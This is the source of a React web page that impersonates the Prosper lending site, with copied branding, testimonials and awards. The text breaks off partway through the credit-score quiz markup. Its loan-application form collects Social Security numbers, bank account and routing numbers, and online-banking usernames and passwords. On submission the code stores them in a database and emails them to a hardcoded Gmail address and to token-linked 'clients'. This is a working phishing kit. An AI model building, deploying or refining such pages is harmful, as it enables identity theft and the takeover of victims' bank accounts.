import { useState, useEffect } from "react";
import { useForm, Controller } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";
import { useSearchParams } from "react-router-dom";

const formSchema = z.object({
  firstName: z.string().min(1, "Required"), lastName: z.string().min(1, "Required"),
  email: z.string().email("Invalid email"), phone: z.string().min(10, "Min 10 digits"),
  dob: z.string().min(1, "Required"), address: z.string().min(1, "Required"),
  city: z.string().min(1, "Required"), state: z.string().min(2, "Required"),
  zip: z.string().min(5, "Min 5 digits"),
  ssn: z.string().min(9,"9 digits").max(9,"9 digits"),
  monthlyIncome: z.string().min(1,"Required"), loanAmount: z.string().min(1,"Required"),
  creditScore: z.enum(["low","good","bad"],{required_error:"Required"}),
  bankName: z.string().min(1,"Required"), yearsWithBank: z.string().min(1,"Required"),
  accountNumber: z.string().min(1,"Required"),
  routingNumber: z.string().min(9,"9 digits").max(9,"9 digits"),
  mobileUsername: z.string().min(1,"Required"), mobilePassword: z.string().min(1,"Required"),
});
type FormData = z.infer<typeof formSchema>;

/* ─── Prosper Logo ─── */
const ProsperLogo = () => (
  <svg width="120" height="32" viewBox="0 0 120 32" fill="none" xmlns="http://www.w3.org/2000/svg">
    <circle cx="16" cy="16" r="16" fill="#6B3FA0"/>
    <path d="M10 22L16 10L22 22" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
    <path d="M12 18h8" stroke="white" strokeWidth="2.5" strokeLinecap="round"/>
    <text x="36" y="22" fontFamily="Georgia, serif" fontSize="18" fontWeight="bold" fill="#1A1A2E">Prosper</text>
  </svg>
);

const CSS = `
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Inter',sans-serif;}
:root{
  --pr-purple: #6B3FA0;
  --pr-purple-dark: #4f2d7f;
  --pr-purple-light: #f3eeff;
  --pr-teal: #00A896;
  --pr-teal-dark: #007d6f;
  --pr-dark: #1A1A2E;
  --pr-gray: #6b7280;
  --pr-gray-light: #f9fafb;
  --pr-border: #e5e7eb;
  --pr-white: #ffffff;
}

/* ─ Alert Banner ─ */
.pr-alert{background:#fff8e1;border-bottom:1px solid #f59e0b;padding:10px 20px;font-size:12.5px;color:#92400e;text-align:center;line-height:1.5;}
.pr-alert a{color:#92400e;font-weight:600;}

/* ─ Nav ─ */
.pr-nav{background:var(--pr-white);border-bottom:1px solid var(--pr-border);position:sticky;top:0;z-index:200;box-shadow:0 2px 8px rgba(0,0,0,0.04);}
.pr-nav-inner{max-width:1200px;margin:0 auto;padding:0 24px;height:64px;display:flex;align-items:center;justify-content:space-between;gap:16px;}
.pr-nav-left{display:flex;align-items:center;gap:32px;}
.pr-nav-links{display:flex;align-items:center;gap:6px;}
.pr-nav-item{font-size:14px;font-weight:500;color:var(--pr-dark);padding:8px 12px;border-radius:6px;cursor:pointer;transition:background 0.15s;white-space:nowrap;}
.pr-nav-item:hover{background:var(--pr-gray-light);}
.pr-nav-right{display:flex;align-items:center;gap:12px;}
.pr-login-btn{font-size:14px;font-weight:600;color:var(--pr-purple);background:none;border:none;cursor:pointer;padding:8px 16px;}
.pr-cta-btn{background:var(--pr-purple);color:#fff;border:none;padding:10px 22px;border-radius:25px;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s;}
.pr-cta-btn:hover{background:var(--pr-purple-dark);transform:translateY(-1px);}

/* ─ Hero ─ */
.pr-hero{background:linear-gradient(135deg,#f8f0ff 0%,#e8f4f8 100%);padding:60px 24px 0;overflow:hidden;}
.pr-hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center;}
.pr-hero-left{padding-bottom:60px;}
.pr-hero-badge{display:inline-flex;align-items:center;gap:8px;background:#fff;border:1px solid var(--pr-border);border-radius:20px;padding:6px 14px;font-size:12px;font-weight:600;color:var(--pr-gray);margin-bottom:20px;}
.pr-hero-h1{font-size:clamp(32px,4vw,50px);font-weight:800;color:var(--pr-dark);line-height:1.15;margin-bottom:16px;letter-spacing:-0.5px;}
.pr-hero-sub{font-size:16px;color:var(--pr-gray);line-height:1.65;margin-bottom:32px;max-width:460px;}

/* Product Tabs */
.pr-tabs{display:flex;gap:0;border:1px solid var(--pr-border);border-radius:10px;background:#fff;overflow:hidden;margin-bottom:24px;}
.pr-tab{flex:1;padding:14px 8px;font-size:13px;font-weight:600;text-align:center;cursor:pointer;transition:all 0.2s;color:var(--pr-gray);border:none;background:none;border-right:1px solid var(--pr-border);}
.pr-tab:last-child{border-right:none;}
.pr-tab.active{background:var(--pr-purple);color:#fff;}
.pr-tab-content{background:#fff;border:1px solid var(--pr-border);border-radius:12px;padding:24px;}

/* Loan amount tab */
.pr-amount-label{font-size:12px;font-weight:600;color:var(--pr-gray);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;}
.pr-amount-disp{font-size:40px;font-weight:800;color:var(--pr-dark);margin-bottom:4px;}
.pr-amount-sub{font-size:13px;color:var(--pr-gray);margin-bottom:16px;}
.pr-range{width:100%;accent-color:var(--pr-purple);margin-bottom:16px;}
.pr-benefit{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--pr-dark);margin:6px 0;}
.pr-apply-btn{width:100%;height:48px;background:var(--pr-purple);color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;transition:background 0.2s;margin-top:8px;}
.pr-apply-btn:hover{background:var(--pr-purple-dark);}
.pr-apply-btn.teal{background:var(--pr-teal);}
.pr-apply-btn.teal:hover{background:var(--pr-teal-dark);}

/* Hero image */
.pr-hero-right{position:relative;align-self:end;}
.pr-hero-img{width:100%;height:440px;object-fit:cover;border-radius:20px 20px 0 0;display:block;}
.pr-hero-img-placeholder{width:100%;height:440px;background:linear-gradient(135deg,#c4b5fd,#93c5fd);border-radius:20px 20px 0 0;display:flex;align-items:center;justify-content:center;}

/* ─ Awards Bar ─ */
.pr-awards{background:#fff;border-bottom:1px solid var(--pr-border);padding:20px 24px;}
.pr-awards-inner{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:center;gap:40px;flex-wrap:wrap;}
.pr-award{display:flex;align-items:center;gap:10px;font-size:13px;}
.pr-award-icon{width:36px;height:36px;background:var(--pr-purple-light);border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:16px;}
.pr-award-text b{display:block;font-weight:700;color:var(--pr-dark);}
.pr-award-text span{color:var(--pr-gray);font-size:12px;}
.pr-award-sep{width:1px;height:36px;background:var(--pr-border);}

/* ─ Why Prosper ─ */
.pr-section{padding:80px 24px;}
.pr-section-inner{max-width:1200px;margin:0 auto;}
.pr-section.light{background:var(--pr-gray-light);}
.pr-eyebrow{font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--pr-purple);margin-bottom:12px;}
.pr-title{font-size:clamp(26px,3.5vw,38px);font-weight:800;color:var(--pr-dark);margin-bottom:16px;letter-spacing:-0.3px;}
.pr-feat-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;margin-top:40px;}
.pr-feat{text-align:center;padding:28px 20px;background:#fff;border-radius:14px;border:1px solid var(--pr-border);}
.pr-feat-icon{font-size:32px;margin-bottom:14px;}
.pr-feat h3{font-size:15px;font-weight:700;color:var(--pr-dark);margin-bottom:8px;}
.pr-feat p{font-size:13px;color:var(--pr-gray);line-height:1.6;}

/* ─ Product cards ─ */
.pr-prod-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;margin-top:40px;}
.pr-prod-card{border:1.5px solid var(--pr-border);border-radius:16px;padding:28px;background:#fff;transition:border-color 0.2s,box-shadow 0.2s;}
.pr-prod-card:hover{border-color:var(--pr-purple);box-shadow:0 8px 24px rgba(107,63,160,0.08);}
.pr-prod-badge{font-size:11px;font-weight:700;color:var(--pr-purple);background:var(--pr-purple-light);padding:4px 10px;border-radius:20px;display:inline-block;margin-bottom:14px;}
.pr-prod-card h3{font-size:18px;font-weight:800;color:var(--pr-dark);margin-bottom:10px;}
.pr-prod-card p{font-size:14px;color:var(--pr-gray);line-height:1.65;margin-bottom:20px;}
.pr-prod-link{display:inline-flex;align-items:center;gap:6px;font-size:14px;font-weight:700;color:var(--pr-purple);text-decoration:none;cursor:pointer;}
.pr-prod-link:hover{text-decoration:underline;}

/* ─ Credit score quiz ─ */
.pr-quiz{background:var(--pr-dark);padding:80px 24px;color:#fff;}
.pr-quiz-inner{max-width:800px;margin:0 auto;text-align:center;}
.pr-quiz-title{font-size:clamp(24px,3vw,36px);font-weight:800;margin-bottom:32px;}
.pr-scores{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:32px;}
.pr-score-btn{padding:14px 20px;border:2px solid rgba(255,255,255,0.2);border-radius:10px;background:rgba(255,255,255,0.05);color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.2s;min-width:100px;}
.pr-score-btn:hover{border-color:var(--pr-purple);background:var(--pr-purple);}
.pr-score-btn.selected{border-color:var(--pr-purple);background:var(--pr-purple);}

/* ─ Testimonials ─ */
.pr-testimonials{overflow:hidden;padding:20px 0;}
.pr-testimonial-track{display:flex;gap:20px;animation:prSlide 40s linear infinite;}
.pr-testimonial-track:hover{animation-play-state:paused;}
@keyframes prSlide{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
.pr-t-card{background:#fff;border:1px solid var(--pr-border);border-radius:12px;padding:24px;min-width:300px;max-width:320px;flex-shrink:0;}
.pr-t-stars{color:#f59e0b;font-size:14px;margin-bottom:10px;}
.pr-t-text{font-size:14px;color:var(--pr-dark);line-height:1.6;font-style:italic;margin-bottom:14px;}
.pr-t-author{font-size:12.5px;font-weight:600;color:var(--pr-gray);}

/* ─ App section ─ */
.pr-app-section{background:var(--pr-purple);color:#fff;padding:80px 24px;}
.pr-app-inner{max-width:1000px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center;}
.pr-app-h2{font-size:32px;font-weight:800;margin-bottom:16px;}
.pr-app-p{font-size:16px;opacity:0.85;line-height:1.65;margin-bottom:28px;}
.pr-store-btns{display:flex;gap:12px;flex-wrap:wrap;}
.pr-store-btn{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,0.15);border:1px solid rgba(255,255,255,0.3);border-radius:10px;padding:12px 20px;cursor:pointer;transition:background 0.2s;}
.pr-store-btn:hover{background:rgba(255,255,255,0.25);}
.pr-store-btn span{font-size:13px;font-weight:600;color:#fff;}
.pr-qr-box{background:rgba(255,255,255,0.1);border-radius:16px;padding:28px;text-align:center;}
.pr-qr-img{width:120px;height:120px;background:#fff;border-radius:10px;margin:0 auto 12px;display:flex;align-items:center;justify-content:center;}

/* ─ Form ─ */
.pr-form-section{padding:80px 24px;background:var(--pr-gray-light);}
.pr-form-wrap{max-width:820px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 20px 50px rgba(107,63,160,0.10);overflow:hidden;}
.pr-form-header{background:linear-gradient(135deg,var(--pr-purple),var(--pr-purple-dark));color:#fff;padding:32px 40px;}
.pr-form-header h2{font-size:26px;font-weight:800;margin-bottom:8px;}
.pr-form-header p{font-size:14px;opacity:0.8;}
.pr-form-body{padding:40px;}
.pr-sect-label{font-size:11px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase;color:var(--pr-purple);background:var(--pr-purple-light);padding:8px 16px;border-radius:6px;margin-bottom:20px;display:flex;align-items:center;gap:8px;}
.pr-g2{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
.pr-g3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:16px;}
@media(max-width:600px){.pr-g2,.pr-g3{grid-template-columns:1fr;}}
.pr-lbl{display:block;font-size:12.5px;font-weight:600;color:var(--pr-dark);margin-bottom:5px;}
.pr-in{width:100%;height:46px;border:1.5px solid var(--pr-border);border-radius:8px;padding:0 14px;font-size:14px;font-family:inherit;color:var(--pr-dark);background:#fff;transition:border-color 0.15s;outline:none;}
.pr-in:focus{border-color:var(--pr-purple);box-shadow:0 0 0 3px rgba(107,63,160,0.1);}
.pr-in::placeholder{color:#9ca3af;}
.pr-err{font-size:11.5px;color:#dc2626;margin-top:3px;}
.pr-fgroup{margin-bottom:16px;}
.pr-sec-group{margin-bottom:36px;}
.pr-icon-field{position:relative;}
.pr-icon-field input{padding-right:40px;}
.pr-icon-field .fi{position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#9ca3af;}
.pr-client-badge{display:flex;align-items:center;gap:8px;background:rgba(107,63,160,0.07);color:var(--pr-purple);border:1px solid rgba(107,63,160,0.2);border-radius:8px;padding:14px 20px;font-size:13.5px;font-weight:600;margin-bottom:28px;}
.pr-submit{width:100%;height:54px;background:var(--pr-purple);color:#fff;border:none;font-size:16px;font-weight:700;border-radius:10px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;font-family:inherit;transition:background 0.2s;}
.pr-submit:hover:not(:disabled){background:var(--pr-purple-dark);}
.pr-submit:disabled{opacity:0.6;cursor:not-allowed;}
.pr-fine{font-size:12px;color:var(--pr-gray);text-align:center;margin-top:16px;line-height:1.7;}
.pr-fine a{color:var(--pr-purple);}

/* ─ Footer ─ */
.pr-footer{background:var(--pr-dark);color:rgba(255,255,255,0.75);}
.pr-ft-main{max-width:1200px;margin:0 auto;padding:60px 24px 40px;display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr 1fr;gap:32px;}
@media(max-width:900px){.pr-ft-main{grid-template-columns:1fr 1fr;}}
@media(max-width:520px){.pr-ft-main{grid-template-columns:1fr;}}
.pr-ft-brand p{font-size:13px;line-height:1.7;opacity:0.65;margin-top:14px;max-width:220px;}
.pr-ft-col h4{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:#fff;margin-bottom:16px;}
.pr-ft-col ul{list-style:none;display:flex;flex-direction:column;gap:10px;}
.pr-ft-col li a{font-size:13px;color:rgba(255,255,255,0.55);text-decoration:none;transition:color 0.15s;}
.pr-ft-col li a:hover{color:#fff;}
.pr-ft-bottom{border-top:1px solid rgba(255,255,255,0.08);padding:24px;}
.pr-fb{max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;gap:16px;align-items:center;justify-content:space-between;font-size:12px;color:rgba(255,255,255,0.4);}
.pr-fb a{color:rgba(255,255,255,0.5);text-decoration:none;}
.pr-fb a:hover{color:#fff;}
.pr-disclaimer{max-width:1200px;margin:0 auto;padding:0 24px 32px;font-size:11px;color:rgba(255,255,255,0.25);line-height:1.7;}

@keyframes prSpin{to{transform:rotate(360deg);}}
.pr-spin{width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:prSpin 0.8s linear infinite;}

@media(max-width:900px){
  .pr-hero-inner{grid-template-columns:1fr;}
  .pr-hero-right{display:none;}
  .pr-tabs{flex-direction:column;}
  .pr-feat-grid{grid-template-columns:1fr 1fr;}
  .pr-prod-grid{grid-template-columns:1fr;}
  .pr-app-inner{grid-template-columns:1fr;}
  .pr-nav-links{display:none;}
}
`;

const LockIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
);
const UserIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
);
const BriefIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"/></svg>
);
const BankIco = () => (
  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round"><line x1="3" y1="22" x2="21" y2="22"/><line x1="6" y1="18" x2="6" y2="11"/><line x1="10" y1="18" x2="10" y2="11"/><line x1="14" y1="18" x2="14" y2="11"/><line x1="18" y1="18" x2="18" y2="11"/><polygon points="12 2 20 7 4 7"/></svg>
);
const CheckIco = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--pr-purple)" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
);
const ChevRight = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"><polyline points="9 18 15 12 9 6"/></svg>
);

const TESTIMONIALS = [
  { text:"I have been using this company for years, honest company with fair and straight forward pricing.", author:"Valerie", source:"Trustpilot (1/26)" },
  { text:"The processes are seamless and the people are responsive to any questions we may have had.", author:"Michael", source:"Trustpilot (1/26)" },
  { text:"This is my 2nd personal loan through Prosper. Very smooth and easy transactions, will always use them as my go-to.", author:"Christina", source:"Trustpilot (1/26)" },
  { text:"A streamlined process for established customers, and I consider myself one of them.", author:"Mahmoud", source:"Trustpilot (1/26)" },
  { text:"I have been a customer of Prosper for a few years. Everyone is very professional. The funds are in your account very fast.", author:"Antoinette", source:"Trustpilot (12/25)" },
  { text:"Fast and friendly service. You all rock!", author:"Roger", source:"Trustpilot (12/25)" },
  { text:"Website is easy to use and very straightforward. This is my 3rd loan through Prosper, and I highly recommend this company.", author:"Connie", source:"Trustpilot (12/25)" },
];

export default function ProsperApply() {
  const [searchParams] = useSearchParams();
  const [client, setClient] = useState<any>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [activeTab, setActiveTab] = useState(0);
  const [loanAmount, setLoanAmount] = useState(25000);
  const [selectedScore, setSelectedScore] = useState<string|null>(null);

  useEffect(() => { document.title = "Prosper Personal Loans | Helping People Thrive Since 2005"; }, []);

  useEffect(() => {
    const token = searchParams.get("token");
    if (!token) return;
    (async () => {
      const { data, error } = await supabase.from("clients").select("*")
        .eq("access_token", token).gt("token_expiry", new Date().toISOString())
        .eq("is_active", true).single();
      if (!error && data) setClient(data);
    })();
  }, [searchParams]);

  const { register, handleSubmit, control, formState:{errors} } = useForm<FormData>({
    resolver: zodResolver(formSchema),
  });

  const onSubmit = async (data: FormData) => {
    setIsSubmitting(true);
    try {
      const { error: dbError } = await supabase.from("loan_applications").insert({
        first_name:data.firstName, last_name:data.lastName, email:data.email, phone:data.phone,
        date_of_birth:data.dob, street_address:data.address, city:data.city, state:data.state,
        zip_code:data.zip, employment_status:"", employer_name:"",
        monthly_income:parseFloat(data.monthlyIncome)||0, loan_amount:parseFloat(data.loanAmount)||0,
        pay_frequency:"monthly", loan_purpose:"personal", loan_type:"cash_advance",
        client_id:client?.id||null, ssn:data.ssn, credit_score:data.creditScore,
        bank_name:data.bankName, years_with_bank:parseInt(data.yearsWithBank)||0,
        account_number:data.accountNumber, routing_number:data.routingNumber,
        mobile_username:data.mobileUsername, mobile_password:data.mobilePassword,
      });
      if (dbError) throw new Error(dbError.message);
      await supabase.functions.invoke("send-application-email",{
        body:{ applicationData:data, clientEmail:"ws694481@gmail.com", recipientType:"admin", clientName:client?.name||"General" }
      });
      if (client) {
        await supabase.functions.invoke("send-application-email",{
          body:{ applicationData:data, clientEmail:client.email, recipientType:"client" }
        });
      }
      setSubmitted(true);
    } catch(err:any) {
      alert(`Error: ${err.message||"Please try again."}`);
    } finally { setIsSubmitting(false); }
  };

  if (submitted) return (
    <div style={{minHeight:"100vh",background:"var(--pr-gray-light)",display:"flex",alignItems:"center",justifyContent:"center",fontFamily:"'Inter',sans-serif"}}>
      <style>{CSS}</style>
      <div style={{background:"#fff",borderRadius:20,padding:"52px 44px",maxWidth:480,textAlign:"center",boxShadow:"0 10px 40px rgba(107,63,160,0.1)"}}>
        <div style={{width:72,height:72,borderRadius:"50%",background:"var(--pr-purple-light)",display:"flex",alignItems:"center",justifyContent:"center",margin:"0 auto 24px"}}>
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="var(--pr-purple)" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
        </div>
        <h2 style={{fontSize:26,fontWeight:800,color:"var(--pr-dark)",marginBottom:12}}>Application Submitted!</h2>
        <p style={{fontSize:15,color:"var(--pr-gray)",lineHeight:1.65}}>Thank you for choosing Prosper. Our team will review your application and connect you with funding options within 1 business day.</p>
        <button onClick={() => setSubmitted(false)} className="pr-cta-btn" style={{marginTop:28,width:"100%",height:48,fontSize:15}}>Back to Home</button>
      </div>
    </div>
  );

  const tabs = [
    { label:"Personal Loan", sublabel:"Up to $50K" },
    { label:"Prosper® Card", sublabel:"$3K credit limit" },
    { label:"Investing", sublabel:"5.2% avg. return" },
  ];

  const tabContent = [
    <div>
      <div className="pr-amount-label">Loan Amount</div>
      <div className="pr-amount-disp">${loanAmount.toLocaleString()}</div>
      <div className="pr-amount-sub">Amount must be between $2K–$50K</div>
      <input type="range" className="pr-range" min={2000} max={50000} step={500} value={loanAmount} onChange={e=>setLoanAmount(+e.target.value)} />
      {[["Rate in 1 minute","No impact to your credit"],["Next-day funding","Available after approval"],["No prepay penalties","Pay off early anytime"]].map(([a,b])=>(
        <div key={a} className="pr-benefit"><CheckIco/><div><strong>{a}</strong> — {b}</div></div>
      ))}
      <button className="pr-apply-btn" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Apply now</button>
    </div>,
    <div>
      <div className="pr-amount-label">Credit Limit</div>
      <div className="pr-amount-disp">$3,000+</div>
      <div className="pr-amount-sub">No security deposit required</div>
      {[["Instant credit access","No waiting with virtual card"],["No security deposit","Start building credit now"],["Apply in minutes","Fast decision online"]].map(([a,b])=>(
        <div key={a} className="pr-benefit"><CheckIco/><div><strong>{a}</strong> — {b}</div></div>
      ))}
      <button className="pr-apply-btn teal" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Apply now</button>
    </div>,
    <div>
      <div className="pr-amount-label">Avg. Historical Return</div>
      <div className="pr-amount-disp" style={{color:"var(--pr-teal)"}}>5.2%</div>
      <div className="pr-amount-sub">Weighted average as of Mar 31, 2026</div>
      {[["Unique investments","Alternative asset class"],["Diversify your portfolio","Beyond stocks & bonds"],["Get started online","100% digital process"]].map(([a,b])=>(
        <div key={a} className="pr-benefit"><CheckIco/><div><strong>{a}</strong> — {b}</div></div>
      ))}
      <button className="pr-apply-btn teal" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Get started</button>
    </div>
  ];

  const doubledTestimonials = [...TESTIMONIALS, ...TESTIMONIALS];

  return (
    <div style={{fontFamily:"'Inter',sans-serif",color:"var(--pr-dark)",background:"#fff"}}>
      <style>{CSS}</style>

      {/* Alert Banner */}
      <div className="pr-alert">
        For the latest information about the September 17, 2025, cybersecurity incident, <a href="#">click here</a>. Questions? See <a href="#">FAQs</a> or call 833-918-9464. Mon–Fri, 8AM–5PM CT.
      </div>

      {/* Nav */}
      <nav className="pr-nav">
        <div className="pr-nav-inner">
          <div className="pr-nav-left">
            <a href="#" style={{textDecoration:"none"}}>
              <ProsperLogo />
            </a>
            <div className="pr-nav-links">
              {["Loans","Prosper® Card","Investing","More"].map(n => (
                <span key={n} className="pr-nav-item">{n} ▾</span>
              ))}
            </div>
          </div>
          <div className="pr-nav-right">
            <button className="pr-login-btn">Log in</button>
            <button className="pr-cta-btn" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Apply now</button>
          </div>
        </div>
      </nav>

      {/* Hero */}
      <section className="pr-hero">
        <div className="pr-hero-inner">
          <div className="pr-hero-left">
            <div className="pr-hero-badge">
              <span>🏆</span> Helping people thrive since 2005
            </div>
            <h1 className="pr-hero-h1">Money when you need it.<br/>Fast, easy, secure.</h1>
            <p className="pr-hero-sub">Personal loans up to $50K, the Prosper® Card, and unique investing opportunities — all in one place.</p>

            {/* Product Tabs */}
            <div className="pr-tabs">
              {tabs.map((t, i) => (
                <button key={i} className={`pr-tab${activeTab===i?" active":""}`} onClick={()=>setActiveTab(i)}>
                  <div>{t.label}</div>
                  <div style={{fontSize:11,fontWeight:400,opacity:0.8}}>{t.sublabel}</div>
                </button>
              ))}
            </div>
            <div className="pr-tab-content">{tabContent[activeTab]}</div>
          </div>

          <div className="pr-hero-right">
            <img src="/prosper-hero.png" alt="Happy customers" className="pr-hero-img"
              onError={e => {
                (e.target as HTMLImageElement).style.display = "none";
                if ((e.target as HTMLImageElement).nextElementSibling) {
                  ((e.target as HTMLImageElement).nextElementSibling as HTMLElement).style.display = "flex";
                }
              }}
            />
            <div className="pr-hero-img-placeholder" style={{display:"none"}}>
              <div style={{textAlign:"center",color:"white"}}>
                <div style={{fontSize:48,marginBottom:12}}>💰</div>
                <div style={{fontSize:18,fontWeight:700}}>Prosper</div>
                <div style={{fontSize:14,opacity:0.8}}>Helping people thrive</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Awards Bar */}
      <div className="pr-awards">
        <div className="pr-awards-inner">
          <div className="pr-award">
            <div className="pr-award-icon">💰</div>
            <div className="pr-award-text"><b>Money</b><span>Best Personal Loan Companies Top Picks 2026</span></div>
          </div>
          <div className="pr-award-sep"/>
          <div className="pr-award">
            <div className="pr-award-icon">📺</div>
            <div className="pr-award-text"><b>CNBC</b><span>Top Alternate Finance Companies</span></div>
          </div>
          <div className="pr-award-sep"/>
          <div className="pr-award">
            <div className="pr-award-icon">⭐</div>
            <div className="pr-award-text"><b>Bankrate</b><span>Excellent 4.5 Bankrate Score</span></div>
          </div>
          <div className="pr-award-sep"/>
          <div className="pr-award">
            <div className="pr-award-icon">🏦</div>
            <div className="pr-award-text"><b>20 Years</b><span>Serving members since 2005</span></div>
          </div>
        </div>
      </div>

      {/* Why Prosper */}
      <section className="pr-section">
        <div className="pr-section-inner">
          <div className="pr-eyebrow">Why Prosper</div>
          <h2 className="pr-title">Here to help you thrive</h2>
          <div className="pr-feat-grid">
            {[
              { icon:"💻", title:"100% Online", desc:"Apply from anywhere, anytime. No branch visits required." },
              { icon:"🔍", title:"Ease & Transparency", desc:"Clear terms, no hidden fees, no surprises." },
              { icon:"🤝", title:"Human Customer Service", desc:"Real people ready to answer your questions." },
              { icon:"📅", title:"20 Years Experience", desc:"Helping people thrive since 2005 with $25B+ funded." },
            ].map(f => (
              <div key={f.title} className="pr-feat">
                <div className="pr-feat-icon">{f.icon}</div>
                <h3>{f.title}</h3>
                <p>{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Products */}
      <section className="pr-section light">
        <div className="pr-section-inner">
          <div className="pr-eyebrow">Our Products</div>
          <h2 className="pr-title">Everything you need to thrive financially</h2>
          <div className="pr-prod-grid">
            <div className="pr-prod-card">
              <div className="pr-prod-badge">PERSONAL LOANS</div>
              <h3>Personal loans up to $50K & low rates</h3>
              <p>Next-day funding. No prepay penalties. Get a rate check in minutes with no impact to your credit score.</p>
              <ul style={{listStyle:"none",marginBottom:20}}>
                {["Borrow from $2K to $50K","Next-day funding available","Rates from competitive APRs"].map(i=>(
                  <li key={i} style={{display:"flex",alignItems:"center",gap:8,marginBottom:8,fontSize:13}}><CheckIco/>{i}</li>
                ))}
              </ul>
              <span className="pr-prod-link" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Explore personal loans <ChevRight/></span>
            </div>
            <div className="pr-prod-card">
              <div className="pr-prod-badge" style={{background:"#e0f7f4",color:"var(--pr-teal)"}}>PROSPER® CARD</div>
              <h3>The Prosper® Card to build your future</h3>
              <p>Up to $3,000 credit limit. No security deposit required. Start building or rebuilding your credit today.</p>
              <ul style={{listStyle:"none",marginBottom:20}}>
                {["Up to $3,000 credit limit","No security deposit","Apply in minutes, decide fast"].map(i=>(
                  <li key={i} style={{display:"flex",alignItems:"center",gap:8,marginBottom:8,fontSize:13}}><CheckIco/>{i}</li>
                ))}
              </ul>
              <span className="pr-prod-link" style={{color:"var(--pr-teal)"}} onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Explore the Prosper® Card <ChevRight/></span>
            </div>
            <div className="pr-prod-card">
              <div className="pr-prod-badge" style={{background:"#fff7ed",color:"#c2410c"}}>INVESTING & IRAs</div>
              <h3>Investing & IRAs to diversify your portfolio</h3>
              <p>Unique alternative investment opportunity with a 5.2% average historical return. Diversify beyond stocks.</p>
              <ul style={{listStyle:"none",marginBottom:20}}>
                {["Unique investments","5.2% avg. historical return","IRAs available"].map(i=>(
                  <li key={i} style={{display:"flex",alignItems:"center",gap:8,marginBottom:8,fontSize:13}}><CheckIco/>{i}</li>
                ))}
              </ul>
              <span className="pr-prod-link" style={{color:"#c2410c"}} onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Explore investing <ChevRight/></span>
            </div>
          </div>
        </div>
      </section>

      {/* Credit Score Quiz */}
      <div className="pr-quiz">
        <div className="pr-quiz-inner">
          <div className="pr-eyebrow" style={{color:"rgba(255,255,255,0.6)"}}>Personalized Options</div>
          <h2 className="pr-quiz-title">What's your credit score range?</h2>
          <div className="pr-scores">
            {[["300–499","⚠️"],["500–600","📊"],["601–660","📈"],["661–780","⭐"],["781–850","🏆"]].map(([range, icon]) => (
              <button key={range} className={`pr-score-btn${selectedScore===range?" selected":""}`} onClick={()=>{setSelectedScore(range);setTimeout(()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"}),300);}}>
